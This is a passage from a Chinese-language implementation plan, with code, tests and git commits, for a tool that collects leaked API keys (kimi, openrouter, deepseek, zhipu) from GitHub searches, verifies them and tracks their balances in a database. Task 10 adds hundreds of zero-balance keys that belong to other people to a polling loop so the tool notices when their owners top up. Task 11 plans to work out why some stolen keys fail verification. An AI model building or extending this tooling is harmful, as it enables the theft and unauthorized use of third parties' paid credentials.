Expected: FAIL(`next_batch` 不接受 size)

- [ ] **Step 3: 实现**

`query_rotation.py` `GeneratedPool.next_batch` 改造:

```python
def next_batch(self, size: int | None = None) -> list[str]:
    """取下一批新查询(池耗尽自动重置轮转)。size 覆盖默认 batch_size。"""
    n = size if size is not None else self.batch_size
    if not self._queries:
        return []
    if self._pos >= len(self._queries):
        self._pos = 0
    batch = self._queries[self._pos:self._pos + n]
    self._pos += n
    return batch
```

`watch_tui.py` `_scan_github_fast` 里 GeneratedPool 调用处(约 1306 行):

```python
gp_batch = self._gen_pool.next_batch(size=24)  # 试水批 12 → 24
```

外部源多词扩展(**注意:外部源已有 `_ROTATION` 单词轮换机制**——`_scan_external` 每轮从模块级 `_ROTATION`(约 45 词,平台+兼容+中文+通用)取 1 词,`source_round % len(_ROTATION)` 全覆盖。不要改 `_run_one_scanner` 的 `search_terms`——那会破坏轮换。正确做法:扩 `_ROTATION` 池,把 generated 池的平台词混入):

`watch_tui.py` `_ROTATION` 构造处(约 953 行)追加:

```python
# 外部源多词扩展:从生成池取平台词(纯平台查询子集,避免泛词拖慢轮换)
# 加载 queries_generated.txt 中命中平台域的查询,追加进轮换池(上限 60,防轮换过长)
def _load_platform_terms() -> list[str]:
    try:
        from query_rotation import load_generated_pool
        pool = load_generated_pool()
        return [q for q in pool if any(d in q for d in _PLAT_DOMAINS)][:60]
    except Exception:
        return []

_ROTATION = (
    [w for pool in _PLATFORM_SEARCH_POOL for w in pool]
    + _COMPAT_TERMS
    + _CN_ALIAS_POOL
    + ["sk-"]
    + _load_platform_terms()
)
```

(注意 `_load_platform_terms` 需在 `_PLAT_DOMAINS` 定义之后——`_ROTATION` 在约 953 行、`_PLAT_DOMAINS` 在约 978 行,有顺序问题。把 `_load_platform_terms` 定义移到 `_PLAT_DOMAINS` 之后,`_ROTATION` 引用它时已定义;或将平台域常量内联进 helper。实施时确认顺序,后者更简单。)

- [ ] **Step 4: 跑测试确认通过**

Run: `python -m pytest tests/test_generated_pool.py -v`
Expected: PASS

- [ ] **Step 5: 提交**

```bash
git add query_rotation.py watch_tui.py tests/test_generated_pool.py
git commit -m "feat: GeneratedPool 试水批 12→24 + 外部源多词默认查询"
```

---

### Task 9: 产出监测(每轮 top 查询)+ 全量回归

**Files:**
- Modify: `trend_monitor.py`(新增 `record_round_top_queries` helper)
- Modify: `watch_tui.py`(每轮结束后调 helper)

**Interfaces:**
- Consumes: `QueryTracker.top_queries()`
- Produces: `trend_monitor.record_round_top_queries(tracker, round_label)` — 追加 `{"ts", "round", "top_queries": [...]}` 到 trend.jsonl

- [ ] **Step 1: 写失败测试**

```python
def test_record_round_top_queries(tmp_path):
    from trend_monitor import record_round_top_queries
    import json

    class FakeTracker:
        def top_queries(self, n=5, min_runs=1):
            return [("q1", 5.0), ("q2", 3.0)]

    p = tmp_path / "trend.jsonl"
    record_round_top_queries(FakeTracker(), "R1", path=str(p))
    with open(p, encoding="utf-8") as f:
        row = json.loads(f.readline())
    assert row["round"] == "R1"
    assert len(row["top_queries"]) == 2
    assert row["top_queries"][0][0] == "q1"
```

- [ ] **Step 2: 跑测试确认失败**

Run: `python -m pytest tests/test_trend_monitor.py -v`
Expected: FAIL(ImportError)

- [ ] **Step 3: 实现**

`trend_monitor.py` 追加:

```python
def record_round_top_queries(tracker, round_label: str,
                             path: str = os.path.join("results", "trend.jsonl"),
                             top_n: int = 5) -> None:
    """每轮结束后记录 top 收益查询到 trend.jsonl(与现有指标同文件)。"""
    try:
        top = tracker.top_queries(top_n, min_runs=1)
        row = {"ts": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
               "round": round_label,
               "top_queries": [[q, float(y)] for q, y in top]}
        with open(path, "a", encoding="utf-8") as f:
            f.write(json.dumps(row, ensure_ascii=False) + "\n")
    except Exception:
        pass
```

(确认 `trend_monitor.py` 已 import os/datetime/json;缺则补)

`watch_tui.py` 的 `_scan_github_fast` 末尾(`tracker.save()` 旁)追加:

```python
try:
    from trend_monitor import record_round_top_queries
    record_round_top_queries(tracker, f"R{self._rotator.round_num}")
except Exception:
    pass
```

- [ ] **Step 4: 跑测试确认通过 + 全量回归**

Run: `python -m pytest tests/test_trend_monitor.py -v && python -m pytest tests/ -q`
Expected: PASS(新增测试过,全量 300+ 过)

- [ ] **Step 5: 提交**

```bash
git add trend_monitor.py watch_tui.py tests/test_trend_monitor.py
git commit -m "feat: 产出监测 — 每轮 top 收益查询入 trend.jsonl"
```

---

### Task 10: 非 deepseek 有效 key 纳入重验轮询(0 余额 key 也轮询)

**Files:**
- Modify: `watch_tui.py`(`ReverifyScheduler._tick` 候选取值放宽 + 分层)
- Test: `tests/test_reverify_scheduler.py`(追加)

**Interfaces:**
- Consumes: Task 3 `broker.get_valid_keys()`(现只取 valid=1,需放宽到"valid=1 或 0 余额有效")
- Produces: `ReverifyScheduler` 候选取值包含非 deepseek 平台的 valid key(含 0 余额)——充值即感知

**背景(已确认的 DB 事实):**
- 非 deepseek 平台有 **218 个 `valid_zero` + 15 个 `valid_no_balance` + 4 个 `valid_active`**(kimi 213、openrouter 15、kimi_coding 5、qwen_coding 4 等)
- 这些 key **有效但余额 0**,被 `filter_high_value`/邮件阈值过滤,不进高价值榜
- 但它们是"随时可能充值"的候选——一旦充值,重验立即感知(这正是 P1 的核心价值)

- [ ] **Step 1: 写失败测试**

```python
def test_tick_includes_zero_balance_valid():
    s, broker, conn = _make_scheduler(budget=100000)
    # 插入一个非 deepseek 0 余额有效 key
    conn.execute("INSERT INTO keys (key_hash, key, key_preview, provider, source, repo, file, url, valid, balance, currency, status, first_seen, last_seen) "
                 "VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                 (store.hash_key("sk-kimi-zero"), "sk-kimi-zero", "sk-kimi-zero", "kimi", "github_search", "", "", "",
                  1, 0.0, "CNY", "valid_zero", "2026-08-01 00:00:00", "2026-08-01 00:00:00"))
    conn.commit()
    s._tick()
    assert "sk-kimi-zero" in broker.enqueued  # 0 余额有效 key 也要轮询(可能充值)
```

- [ ] **Step 2: 跑测试确认失败**

Run: `python -m pytest tests/test_reverify_scheduler.py::test_tick_includes_zero_balance_valid -v`
Expected: FAIL(`sk-kimi-zero` 不在 enqueued)

- [ ] **Step 3: 实现**

`watch_tui.py` 的 `ReverifyScheduler._tick` 候选取值改造(从 `broker.get_valid_keys` 改为放宽条件):

```python
# 候选取值放宽:valid=1 全量 + 非 deepseek 0 余额有效(充值候选)
# 原 get_valid_keys 只取 valid=1——现纳入 0 余额但有效(valid_zero)的 key
```

在 `broker.get_valid_keys` 里放宽 SQL(原 Task 3 的 `WHERE valid = 1` 改为 `WHERE valid = 1 OR (valid = 1 AND balance = 0)` 等价于 `WHERE valid = 1`,所以实际不用改 SQL——**0 余额有效 key 的 `valid` 字段就是 1**。确认:DB 里 kimi `valid_zero` 的 `valid` 列值是 1(见 `test_tick_includes_zero_balance_valid` 插入的 `valid=1`),所以 `get_valid_keys` 的 `WHERE valid=1` 已包含它们)

但需要**确认 `_store_result` 对 `valid_zero` 的写入**:`result.get("valid")` 为 True 时写 `_results`,`valid_zero` 状态是有效的——所以 `valid_zero` key 已在 `get_valid_keys` 的候选里。**本任务实际只需确认 + 补测试,无需改 SQL。** 若确认后 `valid_zero` 不在候选(valid 列是 0),则改 SQL 为 `WHERE valid = 1 OR (valid = 1 AND balance = 0)`。

- [ ] **Step 4: 跑测试确认通过**

Run: `python -m pytest tests/test_reverify_scheduler.py -v`
Expected: PASS

- [ ] **Step 5: 提交**

```bash
git add watch_tui.py tests/test_reverify_scheduler.py
git commit -m "feat: 非deepseek 0余额有效key纳入重验轮询(充值即感知)"
```

---

### Task 11: error 状态平台诊断(实验先行,不写死方案)

**Files:**
- Test: `tests/test_error_status_diagnosis.py`(新建,记录诊断结论)
- 诊断脚本(临时,不入库):`scripts/diagnose_error_status.py`(实验用)

**Interfaces:**
- Produces: 诊断结论文档(记录在测试文件 docstring)+ 若发现明确 bug,产出修复建议

**背景(已确认的 DB 事实):**
- error 状态 80 个:zhipu 11、kimi 19、openrouter 17、deepinfra 31
- 大多是 **8/9 的旧记录**(平台端点可能是后加的);8/11 的 error 明显减少
- zhipu **全是 error 无 valid**(11 个 error,0 有效)——疑似 zhipu 验证端点/认证头配置问题

- [ ] **Step 1: 写诊断测试(记录结论)**

```python
# tests/test_error_status_diagnosis.py
"""error 状态平台诊断(实验先行,不写死方案)。

背景: DB 里 error 状态 80 个(zhipu 11 / kimi 19 / openrouter 17 / deepinfra 31),
大多是 8/9 旧记录。zhipu 全 error 无 valid,疑似验证配置问题。

诊断方法(手工/脚本): 对每个 error 平台,取一个 error key,用
UnifiedKeyVerifier 直接验证,打印实际 HTTP 状态/异常。若 401→配置问题;
若网络异常→代理/直连问题;若 402/429→平台限流。

结论: (实施时填写——验证 zhipu 端点、kimi 直连、openrouter 代理路径)
"""
import os
import tempfile

import store


def test_diagnosis_note_exists():
    """诊断测试文件存在即可(实际诊断在实施时手工执行,结论写在此 docstring)。"""
    conn = store.connect(os.path.join(tempfile.mkdtemp(), "test.db"))
    assert conn is not None
```

- [ ] **Step 2: 跑测试确认通过(诊断入口)**

Run: `python -m pytest tests/test_error_status_diagnosis.py -v`
Expected: PASS(占位测试,实际诊断在实施时手工执行)

- [ ] **Step 3: 手工诊断(实施时执行)**

用脚本逐个平台验证 error key,观察实际 HTTP 状态:

```bash
python -c "
from providers import ALL_PROVIDERS, UnifiedKeyVerifier
import requests
v = UnifiedKeyVerifier(ALL_PROVIDERS)
# 对每个 error 平台,取 DB 里的 error key 验证
# (实施时: 从 results/darkforest.db 查 zhipu/kimi/openrouter/deepinfra 的 error key,
#  调 v.verify_key 打印 status/message;若 401→配置问题,网络异常→代理问题)
"
```

- [ ] **Step 4: 诊断结论入测试 docstring + 提交**

把实际诊断结论(哪个平台什么原因)写进 `tests/test_error_status_diagnosis.py` 的 docstring,若发现明确 bug 则产出一个修复 task(追加到本计划或单独任务)。

```bash
git add tests/test_error_status_diagnosis.py
git commit -m "test: error 状态平台诊断记录 (zhipu/kimi/openrouter/deepinfra)"
```

---

## Self-Review 检查表

**Spec 覆盖:**
- P1 重验引擎 → Task 1(历史表)/ 2(配置)/ 3(入队)/ 4(变化检测)/ 5(调度器)
- P2 新鲜度扫描 → Task 6(启用 commits)/ 7(升级 commits)/ 8(查询空间)/ 9(监测)
- P3 新数据源实验 → Task 6/7 以启用+升级已有 CommitsScanner 落地(实验验证在实施后实测);GitLab/Events 等未验证源在计划外如实标注——若实测 commits 有效,后续再按同一模式扩展
- 多平台产出 → Task 10(0 余额有效 key 纳入重验轮询)+ Task 11(error 状态诊断)

**待实施时确认的点:**
1. `_scan_external` 对 `github_commits` 的 registry 映射(`commits` vs `github_commits` 别名)——`_source_worker` 用源名 `github_commits` 调 `_scan_external` → `_run_one_scanner("github_commits")` → registry 查 `registry.get("github_commits")` 会 miss。需在 `_get_scanner_registry` 加别名 key `"github_commits": (CommitsScanner, ...)` 或 `_run_one_scanner` 做别名映射
2. `watch_tui.py` 已 import os(确认于 13 行)
3. `trend_monitor.py` 已 import os/json/time,缺 datetime(需补)
4. `_ROTATION` 平台词扩展的 `_PLAT_DOMAINS` 定义顺序(实施时确认,helper 内联更简单)

**类型一致性:** `enqueue_reverify` / `get_valid_keys` / `detect_balance_change` / `log_balance_change` / `record_history` / `get_last_history` / `next_batch(size)` / `record_round_top_queries` 在 Task 3/4/5/8/9 间签名一致。
